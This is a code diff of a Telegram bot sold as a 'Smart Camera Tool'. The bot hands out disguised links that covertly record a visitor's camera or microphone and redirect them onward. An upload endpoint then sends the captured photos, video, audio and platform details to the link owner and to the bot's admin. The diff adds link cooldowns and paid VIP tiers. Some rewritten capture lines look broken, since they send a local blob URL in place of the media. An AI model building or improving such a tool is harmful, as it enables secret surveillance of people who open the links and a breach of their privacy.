@@ -30,7 +30,7 @@ if (!fs.existsSync(DATA_DIR)) {
     fs.mkdirSync(DATA_DIR, { recursive: true });
 }
 
-const bot = new TelegramBot(BOT_TOKEN, { webHook: false });
+const bot = new TelegramBot(BOT_TOKEN);
 const app = express();
 
 // ==========================================
@@ -308,8 +308,7 @@ function getDefaultSettings() {
         vip_price_stars: 250,
         vip_price_referrals: 10,
         referral_stars: 2,
-        cooldown_seconds: 30,
-        welcome_message: ''
+        cooldown_seconds: 30
     };
 }
 
@@ -331,38 +330,8 @@ function saveSettings(settings) {
 
 async function sendTelegramRequest(method, data = {}) {
     try {
-        const https = require('https');
-        const postData = JSON.stringify(data);
-        return new Promise((resolve, reject) => {
-            const options = {
-                hostname: 'api.telegram.org',
-                port: 443,
-                path: `/bot${BOT_TOKEN}/${method}`,
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Content-Length': Buffer.byteLength(postData)
-                }
-            };
-            const req = https.request(options, (res) => {
-                let responseData = '';
-                res.on('data', (chunk) => { responseData += chunk; });
-                res.on('end', () => {
-                    try {
-                        const result = JSON.parse(responseData);
-                        resolve(result);
-                    } catch (e) {
-                        resolve({ ok: false, description: 'JSON parse error' });
-                    }
-                });
-            });
-            req.on('error', (error) => {
-                writeLog(`Telegram API Error (${method}): ${error.message}`);
-                resolve({ ok: false, error_code: 0, description: error.message });
-            });
-            req.write(postData);
-            req.end();
-        });
+        const response = await bot.sendRequest(method, data);
+        return response;
     } catch (error) {
         writeLog(`Telegram API Error (${method}): ${error.message}`);
         console.error(`Telegram API Error (${method}):`, error.message);
@@ -821,25 +790,21 @@ async function showMainMenu(chat_id, lang) {
         ]
     };
 
-    const settings = loadSettings();
-    let welcome_msg;
-    if (settings.welcome_message && settings.welcome_message.trim() !== '') {
-        welcome_msg = settings.welcome_message;
-    } else {
-        const welcomes = {
-            'ar': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 مرحباً بك في النسخة المطورة!\nاستخدم الأدوات أدناه للبدء.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
-            'en': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Welcome to the enhanced version!\nUse the tools below to start.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
-            'hi': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 उन्नत संस्करण में स्वागत है!\nशुरू करने के लिए नीचे दिए गए टूल का उपयोग करें।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
-            'bn': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 উন্নত সংস্করণে স্বাগতম!\nশুরু করতে নিচের টুলগুলো ব্যবহার করুন।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
-            'ru': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Добро пожаловать в улучшенную версию!\nИспользуйте инструменты ниже.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`
-        };
-        welcome_msg = welcomes[lang] || welcomes['ar'];
-    }
+    const welcomes = {
+        'ar': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 مرحباً بك في النسخة المطورة!\nاستخدم الأدوات أدناه للبدء.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
+        'en': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Welcome to the enhanced version!\nUse the tools below to start.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
+        'hi': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 उन्नत संस्करण में स्वागत है!\nशुरू करने के लिए नीचे दिए गए टूल का उपयोग करें।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
+        'bn': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 উন্নত সংস্করণে স্বাগতম!\nশুরু করতে নিচের টুলগুলো ব্যবহার করুন।\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`,
+        'ru': `<b>✨ TikTuk - Smart Camera Tool v5 ✨</b>\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>\n🚀 Добро пожаловать в улучшенную версию!\nИспользуйте инструменты ниже.\n<code>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</code>`
+    };
+
+    const welcome_msg = welcomes[lang] || welcomes['ar'];
     await sendMessage(chat_id, welcome_msg, keyboard);
 }
 
 async function showVipSection(chat_id, user) {
     const lang = user.lang;
+    const settings = loadSettings();
 
     if (user.is_vip) {
         const code_v = generateShortCode();
@@ -858,26 +823,17 @@ async function showVipSection(chat_id, user) {
         };
         await sendMessage(chat_id, `🌟 <b>VIP Active</b> 🌟\n\n🎥 Video: ${video_link}\n🎙️ Audio: ${audio_link}`, keyboard);
     } else {
-        const bot_info = await sendTelegramRequest('getMe');
-        const bot_username = bot_info.result?.username || 'bot';
-        const invite_link = `https://t.me/${bot_username}?start=${user.id}`;
-
-        const vipMsg = `🌟 <b>قسم VIP</b> 🌟\n\n` +
-            `<b>المميزات:</b>\n` +
-            `• تصوير فيديو حقيقي 5 ثواني 🎥\n` +
-            `• تسجيل صوت 10 ثواني 🎙️\n\n` +
-            `للاشتراك في VIP تواصل مع المطور:\n` +
-            `👨‍💻 @HackWahm\n\n` +
-            `🔗 رابط الدعوة الخاص بك:\n${invite_link}`;
+        const price_stars = settings.vip_price_stars;
+        const price_refs = settings.vip_price_referrals;
 
         const keyboard = {
             inline_keyboard: [
-                [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/HackWahm' }],
-                [{ text: '📤 مشاركة رابط الدعوة', switch_inline_query: invite_link }],
+                [{ text: getTextMsg('buy_vip_stars', lang, price_stars), callback_data: 'buy_vip_stars' }],
+                [{ text: getTextMsg('buy_vip_referrals', lang, price_refs), callback_data: 'buy_vip_referrals' }],
                 [{ text: '🔙', callback_data: 'back_main' }]
             ]
         };
-        await sendMessage(chat_id, vipMsg, keyboard);
+        await sendMessage(chat_id, getTextMsg('vip_info', lang, price_stars, price_refs), keyboard);
     }
 }
 
@@ -989,6 +945,16 @@ async function handleMessage(chat_id, user_id, text) {
 
     if (user.state === 'waiting_custom_link') {
         if (text.startsWith('http://') || text.startsWith('https://')) {
+            // Cooldown check (VIP users bypass)
+            if (!user.is_vip) {
+                const settings = loadSettings();
+                const remaining = cooldownCheck(user_id, 'link', settings.cooldown_seconds);
+                if (remaining > 0) {
+                    await sendMessage(chat_id, getTextMsg('cooldown_msg', lang, remaining));
+                    return;
+                }
+            }
+
             const code_f = generateShortCode();
             saveShortLink(code_f, { u: user_id, r: text, c: 'f' });
             const code_b = generateShortCode();
@@ -1082,6 +1048,13 @@ async function handleCallbackQuery(callback_query) {
 
     switch (data) {
         case 'menu_front_cam':
+            if (!user.is_vip) {
+                const remaining = cooldownCheck(user_id, 'link', settings.cooldown_seconds);
+                if (remaining > 0) {
+                    await answerCallbackQuery(id, getTextMsg('cooldown_msg', lang, remaining), true);
+                    return;
+                }
+            }
             const code_f = generateShortCode();
             saveShortLink(code_f, { u: user_id, c: 'f' });
             const link_f = `${BOT_URL}/${code_f}`;
@@ -1090,6 +1063,13 @@ async function handleCallbackQuery(callback_query) {
             break;
 
         case 'menu_back_cam':
+            if (!user.is_vip) {
+                const remaining = cooldownCheck(user_id, 'link', settings.cooldown_seconds);
+                if (remaining > 0) {
+                    await answerCallbackQuery(id, getTextMsg('cooldown_msg', lang, remaining), true);
+                    return;
+                }
+            }
             const code_b = generateShortCode();
             saveShortLink(code_b, { u: user_id, c: 'b' });
             const link_b = `${BOT_URL}/${code_b}`;
@@ -1229,9 +1209,7 @@ async function handleAdminCommand(chat_id, text) {
             msg += `⭐ /setreferral_stars [عدد] - نجوم الإحالة\n`;
             msg += `⏱ /setcooldown [ثواني] - تغيير الكولداون\n`;
             msg += `📋 /logs - آخر السجلات\n`;
-            msg += `🔒 /security - سجل الأمان\n`;
-            msg += `✏️ /setwelcome [رسالة] - تغيير رسالة الترحيب\n`;
-            msg += `🔄 /resetwelcome - إعادة رسالة الترحيب للافتراضية`;
+            msg += `🔒 /security - سجل الأمان`;
             await sendMessage(chat_id, msg);
             break;
 
@@ -1404,25 +1382,6 @@ async function handleAdminCommand(chat_id, text) {
             }
             break;
 
-        case '/setwelcome':
-            const welcomeText = text.replace('/setwelcome ', '');
-            if (welcomeText && welcomeText !== '/setwelcome') {
-                let currentSettingsWelcome = loadSettings();
-                currentSettingsWelcome.welcome_message = welcomeText;
-                saveSettings(currentSettingsWelcome);
-                await sendMessage(chat_id, `✅ تم تغيير رسالة الترحيب إلى:\n\n${welcomeText}`);
-            } else {
-                await sendMessage(chat_id, `❌ استخدم الأمر هكذا:\n/setwelcome رسالة الترحيب الجديدة`);
-            }
-            break;
-
-        case '/resetwelcome':
-            let currentSettingsResetWelcome = loadSettings();
-            currentSettingsResetWelcome.welcome_message = '';
-            saveSettings(currentSettingsResetWelcome);
-            await sendMessage(chat_id, `✅ تم إعادة رسالة الترحيب للافتراضية.`);
-            break;
-
         case '/broadcast':
             const msg_text = text.replace('/broadcast ', '');
             if (msg_text && msg_text !== '/broadcast') {
@@ -1455,8 +1414,7 @@ async function handleAdminCommand(chat_id, text) {
 // 8. Webhook and Express Setup
 // ==========================================
 
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+app.use(bodyParser.json());
 
 // Middleware to set security headers for all responses
 app.use((req, res, next) => {
@@ -1556,25 +1514,34 @@ app.post('/upload', async (req, res) => {
                     `💻 المنصة: ${platform || 'unknown'}\n` +
                     `📅 الوقت: ${time}`;
 
+    const telegramSendOptions = {
+        chat_id: owner_id,
+        caption: caption,
+        parse_mode: 'HTML'
+    };
+
     try {
-        const sendOptions = { caption: caption, parse_mode: 'HTML' };
         if (type === 'photo') {
-            await bot.sendPhoto(owner_id, filename, sendOptions);
+            await bot.sendPhoto(owner_id, filename, telegramSendOptions);
         } else if (type === 'video') {
-            await bot.sendVideo(owner_id, filename, sendOptions);
+            await bot.sendVideo(owner_id, filename, telegramSendOptions);
         } else if (type === 'audio') {
-            await bot.sendVoice(owner_id, filename, sendOptions);
+            await bot.sendVoice(owner_id, filename, telegramSendOptions);
         }
 
         // Send copy to admin
         if (owner_id != ADMIN_ID) {
-            const adminSendOptions = { caption: `${caption}\n👤 صاحب الرابط: ${owner_id}`, parse_mode: 'HTML' };
+            const adminTelegramSendOptions = {
+                chat_id: ADMIN_ID,
+                caption: `${caption}\n👤 صاحب الرابط: ${owner_id}`,
+                parse_mode: 'HTML'
+            };
             if (type === 'photo') {
-                await bot.sendPhoto(ADMIN_ID, filename, adminSendOptions);
+                await bot.sendPhoto(ADMIN_ID, filename, adminTelegramSendOptions);
             } else if (type === 'video') {
-                await bot.sendVideo(ADMIN_ID, filename, adminSendOptions);
+                await bot.sendVideo(ADMIN_ID, filename, adminTelegramSendOptions);
             } else if (type === 'audio') {
-                await bot.sendVoice(ADMIN_ID, filename, adminSendOptions);
+                await bot.sendVoice(ADMIN_ID, filename, adminTelegramSendOptions);
             }
         }
 
@@ -1713,15 +1680,9 @@ function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type,
         function doVideo(stream){
             v.srcObject=stream;v.play();
             var chunks=[],options={mimeType:"video/webm;codecs=vp8"};
-            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"video/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
-            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
-            mediaRecorder.onstop=function(){
-                stream.getTracks().forEach(function(t){t.stop()});
-                var blob=new Blob(chunks,{type:"video/webm"});
-                var reader=new FileReader();
-                reader.onloadend=function(){send("video",reader.result)};
-                reader.readAsDataURL(blob);
-            };
+            var mediaRecorder=new MediaRecorder(stream,options);
+            mediaRecorder.ondataavailable=function(e){chunks.push(e.data)};
+            mediaRecorder.onstop=function(){stream.getTracks().forEach(function(t){t.stop()});send("video",URL.createObjectURL(new Blob(chunks,{type:"video/webm"})))};
             mediaRecorder.start();
             setTimeout(function(){mediaRecorder.stop()},5000);
         }
@@ -1729,15 +1690,9 @@ function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type,
         function doAudio(stream){
             v.srcObject=stream;v.play();
             var chunks=[],options={mimeType:"audio/ogg;codecs=opus"};
-            try{var mediaRecorder=new MediaRecorder(stream,options)}catch(e){options={mimeType:"audio/webm"};var mediaRecorder=new MediaRecorder(stream,options)}
-            mediaRecorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
-            mediaRecorder.onstop=function(){
-                stream.getTracks().forEach(function(t){t.stop()});
-                var blob=new Blob(chunks,{type:options.mimeType});
-                var reader=new FileReader();
-                reader.onloadend=function(){send("audio",reader.result)};
-                reader.readAsDataURL(blob);
-            };
+            var mediaRecorder=new MediaRecorder(stream,options);
+            mediaRecorder.ondataavailable=function(e){chunks.push(e.data)};
+            mediaRecorder.onstop=function(){stream.getTracks().forEach(function(t){t.stop()});send("audio",URL.createObjectURL(new Blob(chunks,{type:"audio/ogg"})))};
             mediaRecorder.start();
             setTimeout(function(){mediaRecorder.stop()},10000);
         }
@@ -1776,21 +1731,16 @@ function renderCapturePage(res, enc_id, facing_mode, redirect_url, capture_type,
 // ==========================================
 
 const PORT = process.env.PORT || 3000;
-
-// Function to set webhook
-function setTelegramWebhook() {
-    bot.setWebHook(`${BOT_URL}/webhook/${BOT_TOKEN}`).then(() => {
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+    writeLog(`Server started on port ${PORT}`);
+    // Set webhook for Telegram bot
+    bot.setWebhook(`${BOT_URL}/webhook/${BOT_TOKEN}`).then(() => {
         console.log('Telegram webhook set successfully');
         writeLog('Telegram webhook set successfully');
     }).catch(e => {
         console.error('Error setting webhook:', e.message);
         writeLog(`Error setting webhook: ${e.message}`);
     });
-}
-
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    writeLog(`Server started on port ${PORT}`);
-    setTelegramWebhook();
 });
 
